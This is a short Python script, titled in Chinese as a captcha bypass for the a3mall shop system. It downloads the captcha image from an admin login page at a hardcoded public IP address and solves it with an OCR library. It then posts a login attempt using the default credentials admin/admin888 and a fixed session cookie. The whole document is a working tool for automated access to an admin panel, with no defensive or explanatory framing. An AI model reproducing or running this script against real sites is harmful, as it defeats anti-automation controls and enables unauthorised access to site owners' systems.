# a3mall绕过验证码

import requests
import ddddocr
import time

def get_capcha():
    ts = (int(round(time.time() * 1000)))
    url = f"http://114.242.62.22:7003/admin/login/verify.html?t={ts}"
    # url = "http://114.242.62.22:7003/admin/login/verify.html"
    payload = {}
    headers = {
        'Cookie': 'PHPSESSID=73858384b33f72d75aedd4dff04cc4af'
    }
    response = requests.get( url, headers=headers, data=payload)
    open('img.png', 'wb').write(response.content)
    ocr = ddddocr.DdddOcr()
    with open('img.png', 'rb') as f:
        img_bytes = f.read()
    res = ocr.classification(img_bytes)
    print(res)
    return res


def login():
    url = "http://114.242.62.22:7003/admin/login/post.html"
    code = get_capcha()
    payload = f"username=admin&password=admin888&code={code}"
    # payload = "username=admin&password=admin888&code=exwd"
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie': 'PHPSESSID=73858384b33f72d75aedd4dff04cc4af; PHPSESSID=73858384b33f72d75aedd4dff04cc4af',
        'Origin': 'http://114.242.62.22:7003',
        # 'Referer': 'http://114.242.62.22:7003/admin/login/index.html',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest'
    }
    response = requests.request("POST", url, headers=headers, data=payload)
    print((response.json()))

if __name__ == '__main__':
    # get_capcha()
    login()